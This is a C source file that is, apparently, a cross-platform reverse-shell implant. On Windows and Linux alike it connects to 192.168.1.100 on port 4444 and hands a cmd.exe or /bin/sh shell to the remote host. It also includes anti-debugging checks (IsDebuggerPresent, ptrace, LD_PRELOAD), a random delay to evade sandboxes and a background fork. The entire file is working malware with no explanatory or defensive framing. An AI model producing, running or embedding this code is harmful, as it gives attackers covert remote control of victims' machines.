#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

static void anti_debug(void) {
    if (IsDebuggerPresent())
        ExitProcess(0);
}

static void delay_execution(void) {
    srand((unsigned)GetTickCount());
    Sleep((rand() % 60 + 30) * 1000);
}

int main(void) {
    anti_debug();
    delay_execution();

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    connect(sock, (struct sockaddr *)&server, sizeof(server));

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sock);
    WSACleanup();
    return 0;
}
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <time.h>

void anti_debug() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        exit(0);
    }
    if (getenv("LD_PRELOAD") || getenv("LD_LIBRARY_PATH")) {
        exit(0);
    }
}

void delay_execution() {
    srand(time(NULL));
    int delay = rand() % 60 + 30;
    sleep(delay);
}

int main() {
    anti_debug();
    delay_execution();

    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    if (fork() != 0) {
        exit(0);
    }

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
}
#endif
